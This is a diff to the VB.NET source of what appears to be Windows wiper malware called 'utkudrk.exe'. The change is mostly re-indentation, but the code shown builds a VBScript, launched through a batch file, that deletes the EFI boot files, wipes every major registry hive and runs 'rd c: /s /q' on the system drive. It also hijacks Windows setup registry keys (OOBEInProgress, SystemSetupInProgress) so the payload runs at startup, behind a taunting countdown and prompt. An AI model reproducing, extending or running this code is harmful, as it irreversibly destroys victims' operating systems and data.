@@ -7,6 +7,7 @@ Imports System.ServiceProcess
 Imports System.Text
 Imports System.Threading
 Imports Microsoft.Win32
+
 Public Class Form2
 
     Public countdownTime As Integer = 60 ' Countdown timer in seconds
@@ -163,38 +164,38 @@ Public Class Form2
 
         ' VBScript content
         Dim vbsContent As String =
-        "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"", 0, ""utkudrk.exe""" & vbCrLf &
-        "Dim userInput" & vbCrLf &
-        "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
-        "If userInput = ""FUCK YOU"" Then" & vbCrLf &
-        "    Dim shell, fso" & vbCrLf &
-        "    Set shell = CreateObject(""WScript.Shell"")" & vbCrLf &
-        "    Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf &
-        "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
-        "    shell.Run ""icacls x:"", 0, True" & vbCrLf &
-        "    shell.Run ""icacls c:"", 0, True" & vbCrLf &
-        "    If fso.FileExists(""x:\efi\boot\microsoft\bootmgfw.efi"") Then" & vbCrLf &
-        "        shell.Run ""rd x: /s /q"", 0, True" & vbCrLf &
-        "    End If" & vbCrLf &
-        "    shell.Run ""reg delete HKCR /f"", 0, True" & vbCrLf &
-        "    shell.Run ""reg delete HKCU /f"", 0, True" & vbCrLf &
-        "    shell.Run ""reg delete HKLM /f"", 0, True" & vbCrLf &
-        "    shell.Run ""reg delete HKU /f"", 0, True" & vbCrLf &
-        "    shell.Run ""reg delete HKCC /f"", 0, True" & vbCrLf &
-        "    shell.Run ""rd c: /s /q"", 0, True" & vbCrLf &
-        "Else" & vbCrLf &
-        "    MsgBox ""Action canceled because you didn't say FUCK YOU."", 0, ""utkudrk.exe""" & vbCrLf &
-        "End If" & vbCrLf &
-        "Set shell = Nothing" & vbCrLf &
-        "Set fso = Nothing"
+    "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"", 0, ""utkudrk.exe""" & vbCrLf &
+    "Dim userInput" & vbCrLf &
+    "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
+    "If userInput = ""FUCK YOU"" Then" & vbCrLf &
+    "    Dim shell, fso" & vbCrLf &
+    "    Set shell = CreateObject(""WScript.Shell"")" & vbCrLf &
+    "    Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf &
+    "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
+    "    shell.Run ""icacls x:"", 0, True" & vbCrLf &
+    "    shell.Run ""icacls c:"", 0, True" & vbCrLf &
+    "    If fso.FileExists(""x:\efi\boot\microsoft\bootmgfw.efi"") Then" & vbCrLf &
+    "        shell.Run ""rd x: /s /q"", 0, True" & vbCrLf &
+    "    End If" & vbCrLf &
+    "    shell.Run ""reg delete HKCR /f"", 0, True" & vbCrLf &
+    "    shell.Run ""reg delete HKCU /f"", 0, True" & vbCrLf &
+    "    shell.Run ""reg delete HKLM /f"", 0, True" & vbCrLf &
+    "    shell.Run ""reg delete HKU /f"", 0, True" & vbCrLf &
+    "    shell.Run ""reg delete HKCC /f"", 0, True" & vbCrLf &
+    "    shell.Run ""rd c: /s /q"", 0, True" & vbCrLf &
+    "Else" & vbCrLf &
+    "    MsgBox ""Action canceled because you didn't say FUCK YOU."", 0, ""utkudrk.exe""" & vbCrLf &
+    "End If" & vbCrLf &
+    "Set shell = Nothing" & vbCrLf &
+    "Set fso = Nothing"
 
         ' Batch file content
         Dim batContent As String =
-        "@echo off" & vbCrLf &
-        "echo Creating VBScript file..." & vbCrLf &
-        "echo " & vbsContent.Replace(vbCrLf, "^& echo ") & " > """ & vbsFilePath & """" & vbCrLf &
-        "echo VBScript file created." & vbCrLf &
-        "cscript //nologo """ & vbsFilePath & """"
+    "@echo off" & vbCrLf &
+    "echo Creating VBScript file..." & vbCrLf &
+    "echo " & vbsContent.Replace(vbCrLf, "^& echo ") & " > """ & vbsFilePath & """" & vbCrLf &
+    "echo VBScript file created." & vbCrLf &
+    "cscript //nologo """ & vbsFilePath & """"
 
         Try
             ' Write the VBScript and batch file content
@@ -210,12 +211,10 @@ Public Class Form2
             End Using
 
             Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
-                If systemSetupKey IsNot Nothing Then
-                    systemSetupKey.SetValue("OOBEInProgress", 1, RegistryValueKind.DWord)
-                    systemSetupKey.SetValue("SetupType", 2, RegistryValueKind.DWord)
-                    systemSetupKey.SetValue("SetupPhase", 1, RegistryValueKind.DWord)
-                    systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
-                End If
+                systemSetupKey.SetValue("OOBEInProgress", 1, RegistryValueKind.DWord)
+                systemSetupKey.SetValue("SetupType", 2, RegistryValueKind.DWord)
+                systemSetupKey.SetValue("SetupPhase", 1, RegistryValueKind.DWord)
+                systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
             End Using
         Catch ex As UnauthorizedAccessException
             MessageBox.Show("Access denied! Run the application as administrator.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
